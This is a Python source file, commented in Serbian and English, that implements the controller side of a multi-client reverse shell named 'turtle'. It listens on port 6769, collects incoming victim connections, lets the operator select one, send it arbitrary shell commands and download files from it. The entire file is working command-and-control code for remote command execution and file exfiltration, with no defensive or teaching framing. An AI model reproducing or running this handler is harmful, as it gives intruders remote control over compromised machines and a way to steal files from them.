import os
import socket
import sys
import time
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []
SPACE = "<SeP@r@te>"

def socket_create():
    """
    Funkciaj kreira soken preko kog ce se uspostaviti veza
    `Creates a socket for the reverse shell`
    :return:
    """

    try:
        global host
        global port
        global s
        host = ''
        port = 6769
        s = socket.socket()
    except socket.error as msg:
        print(f"Socket error: {str(msg)}")


def socket_bind():
    """
    Kreiramo mesto za osluskavanje uz pomoc porta i socketa

    `Binding our socket to the port and waiting for connections`

    Ex: Pokusava 5 puta da se poveze ako ne uspe 5 put dropuje konekciju

    `It will try to connect 5 times before droping the connections`

    :return:
    """

    try:
        global host
        global port
        global s
        print(f"Binding to port [{str(port)}]")
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print(f"Binding error: {str(msg)} (Retrying....)")
        time.sleep(3)
        socket_bind()


# Kreirane vise konekcija i cuvenje u listu
def accpet_connections():
    """
    Funkciaj prihvata konekcije, da bi ovo bilo moguce moramo pozvati `listen()`
    kao sto je i uradjeno u `socket_bind()`

    `Accepts connections from clients`

    :return:
    """
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()

            all_connections.append(conn)
            all_addresses.append(address)
            print(f"\nConnection has been established: [{address[0]}]\n")
            print("turtle> ", end="")

        except:
            print("Error accepting connections")


def list_connections():
    """
    Prikaz svih konekcija

    `Prints all conections`
    :return:
    """
    results =''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(2048)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + "   IP[" + str(all_addresses[i][0])+"]   Port["+ str(all_addresses[i][1])+"]\n"

    print("----- Clients -----\n" + results)



def get_target(cmd):
    """
    Bira se korisnik nad kojim zelimo da izvrsavamo komande.

    `Choses a user we want to execute our comands`

    :param cmd: Redni broj usera na koji mozemo da se povezemoe
                `Number of the user that we want to connect to`

    :return:Vraca `con` objekat ili `None` u slucaju da nije moguce povezivanje
            `Returns 'con' object or 'None' depending if the connection was established`
    """
    try:
        target = cmd.replace('select ', '').strip()
        target = int(target)
        conn = all_connections[target]

        print(f"Connected to {str(all_addresses[target][0])}\n")
        print(str(all_addresses[target][0])+"> ", end="")
        return conn
    except socket.error as msg:
        print("Not a valid selection!!!")
        print(str(msg))
        return None


def send_target_commands(conn):
    """
    Funkcija se koristi za komuniciranje sa racunarom od klijenta i slanje komandi

    `Function sends commands to the client to execute`

    :param conn: Objekat uspostvaljene konekcije
    :param conn: `Connectio object`
    :return:
    """
    cmd = ''

    while cmd != "quit":
        try:
            cmd = input("")


            if cmd[:4] == "take":
                conn.send(bytes(cmd , "utf-8"))
                data = conn.recv(4096).decode()
                filename , size = data.split(SPACE)
                filename = os.path.basename(filename)
                file = open(str(filename) , 'wb')
                terminated = False
                while not terminated:
                    data = conn.recv(4096)
                    if not data:
                        terminated = True
                        break
                    file.write(data)
                file.close()
                print("Fajl je preuzet")
                break
            elif len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(2048), "utf-8")
                print(client_response, end="")
                if client_response[-3:] == "end":
                    f = open("logs.txt", "w")
                    f.write(client_response)
                    break
        except:
            print("Connection was lost!!!")
            break


def start_turtle():

    while True:
        cmd = input("turtle> ")
        if cmd == 'list':
            list_connections()
        elif "select" in cmd:
            print(cmd)
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == "quit":
            s.detach()
            s.close()
            os._exit(1)
        else:
            print("Command not recognized!!!")



def create_threads():

    """
    Kreiranje niti za izvrsavanje funkcija

    `Creating threads execute functions`

    :return:
    """

    for i in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    """
    Radi sledeci posao u redu (1 - Bavi se vezama, 2 - Salje komande)

    `Does the next function(1 - Handles the connections, 2 - Sends the commands)

    :return:
    """

    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accpet_connections()
        if x == 2:
            start_turtle()
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_threads()
create_jobs()
